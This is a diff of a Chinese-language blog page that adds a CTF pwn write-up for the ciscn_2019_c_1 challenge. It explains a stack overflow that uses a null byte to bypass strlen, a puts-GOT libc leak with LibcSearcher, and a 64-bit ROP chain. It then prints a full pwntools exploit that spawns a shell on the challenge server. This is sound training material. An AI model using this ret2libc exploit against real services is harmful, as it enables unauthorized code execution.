@@ -97,10 +97,74 @@
       
         
 
-        <h3 id="1-分析程序"><a href="#1-分析程序" class="headerlink" title="1.分析程序"></a><strong>1.分析程序</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Hello-CTF:/mnt/c/Users/HelloCTF_OS/Desktop/pwnbuu# checksec ciscn_2019_c_1</span><br><span class="line">[*] &#x27;/mnt/c/Users/HelloCTF_OS/Desktop/pwnbuu/ciscn_2019_c_1&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
+        <p>比较有意思的64位PWN题，中间遇到了一些坑，记录一下</p>
+<h3 id="1-分析程序"><a href="#1-分析程序" class="headerlink" title="1.分析程序"></a><strong>1.分析程序</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Hello-CTF:/mnt/c/Users/HelloCTF_OS/Desktop/pwnbuu# checksec ciscn_2019_c_1</span><br><span class="line">[*] &#x27;/mnt/c/Users/HelloCTF_OS/Desktop/pwnbuu/ciscn_2019_c_1&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
 
-<p>开了NX，64位程序，主要功能是个加解密程序</p>
+<p>开了NX，64位程序，是个加解密程序</p>
 <p><img src="/img/image-20241119110616402.png" alt="image-20241119110616402"></p>
+<p>加密函数</p>
+<p><img src="/img/image-20241119112028576.png" alt="image-20241119112028576"></p>
+<h2 id="2-思路"><a href="#2-思路" class="headerlink" title="2.思路"></a>2.思路</h2><p>没有system和&#x2F;bin&#x2F;sh参数，因此需要构造ROP，并且没有给出libc文件，但存在puts函数，可以用于leak，捋一下步骤。</p>
+<ol>
+<li><p>利用栈溢出点实现溢出</p>
+</li>
+<li><p>调用已经使用过的put函数，来暴露put函数真正入口在内存中的偏移地址</p>
+</li>
+<li><p>通过操作系统内存分页存储的特点，通过put函数后三个字节来（每页4kb），比对出libc的版本</p>
+</li>
+<li><p>在得到的libc中找到我们需要的函数（system）和字符（bin&#x2F;bash），之后加上在内存中的偏移量得到二者在内存中真正的地址</p>
+</li>
+<li><p>最后通过溢出来调用system函数执行bin&#x2F;bash命令</p>
+</li>
+</ol>
+<h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>距离返回地址(0x50+0x08)字节</p>
+<p>加密函数使用了strlen，可以利用\x00中断绕过</p>
+<p><img src="/img/image-20241119112159959.png" alt="image-20241119112159959"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span> + <span class="number">0x08</span> - <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="构造ROP"><a href="#构造ROP" class="headerlink" title="构造ROP"></a>构造ROP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ciscn_2019_c_1 --only &#x27;pop|ret&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20241119112421940.png" alt="image-20241119112421940"></p>
+<h3 id="puts真实地址"><a href="#puts真实地址" class="headerlink" title="puts真实地址"></a>puts真实地址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27937</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line">proc = process(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">main_addr = <span class="number">0x400b28</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">87</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice!\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_puts = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_puts))</span><br></pre></td></tr></table></figure>
+
+<h3 id="system、binsh地址"><a href="#system、binsh地址" class="headerlink" title="system、binsh地址"></a>system、binsh地址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">obj = LibcSearcher(<span class="string">&quot;puts&quot;</span>, libc_puts)</span><br><span class="line"></span><br><span class="line">libc_base = libc_puts - obj.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">libc_sys = libc_base + obj.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">libc_binsh = libc_base + obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">log.info(<span class="string">f&#x27;libc base=<span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>; system=<span class="subst">&#123;<span class="built_in">hex</span>(libc_sys)&#125;</span>; /bin/sh=<span class="subst">&#123;<span class="built_in">hex</span>(libc_binsh)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-构造EXP"><a href="#3-构造EXP" class="headerlink" title="3.构造EXP"></a>3.构造EXP</h2><p>坑点1：ubuntu18环境需要加个ret补齐栈</p>
+<p>坑点2：和之前32位程序不同，较少参数时64位程序使用寄存器传参，因此构造ROP不同</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">28379</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line">proc = process(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">main_addr = <span class="number">0x400b28</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">87</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice!\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_puts = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#print(hex(libc_puts))</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;puts&quot;</span>, libc_puts)</span><br><span class="line">libc_base = libc_puts - obj.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">libc_sys = libc_base + obj.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">libc_binsh = libc_base + obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"><span class="comment">#log.info(f&#x27;libc base=&#123;hex(libc_base)&#125;; system=&#123;hex(libc_sys)&#125;; /bin/sh=&#123;hex(libc_binsh)&#125;&#x27;)</span></span><br><span class="line">payload2 = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">87</span> + p64(ret) + p64(pop_rdi) + p64(libc_binsh) + p64(libc_sys)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice!\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted&#x27;</span>, payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20241119112811274.png" alt="image-20241119112811274"></p>
+<h2 id="4-x86-和-x86-64差异"><a href="#4-x86-和-x86-64差异" class="headerlink" title="4.x86 和 x86_64差异"></a>4.x86 和 x86_64差异</h2><p>在 x86 和 x86_64 两种架构下，ROP 方法的 payload 组织方式不同：</p>
+<ul>
+<li><p>x86 非syscall:</p>
+</li>
+<li><ul>
+<li><p>参数通过栈传递，因此一般无需pop和ret指令；</p>
+</li>
+<li><p>函数能直接访问在payload中预先防止放置的数据，是因为这数据作为些参数通过ebp被访问，而ebp会在函数prologue中设置</p>
+</li>
+<li><ul>
+<li>prologue: push ebp;mov ebp, esp</li>
+<li>epilogue: leave;ret</li>
+</ul>
+</li>
+<li><p>组织形式：FUNCTION ADDR + RETURN ADDR + ARGUMENT_0…N</p>
+</li>
+<li><ul>
+<li>如果要实现执行多个函数，RETURN ADDR需要使用ROP gadget</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>x86_64 非syscall:</p>
+</li>
+<li><ul>
+<li>前6个参数依次<a target="_blank" rel="noopener" href="https://stackoverflow.com/a/2538212/8706476">通过寄存器传递</a></li>
+<li>gadget 均包含ret指令；</li>
+<li>组织形式：GADGET_0 ADDR + ARGUMENT_0 + GADGET_1 ADDR + … + GADGET_N ADDR + ARGUMENT_N + FUNCTION ADDR</li>
+</ul>
+</li>
+</ul>
 
       
     </div>
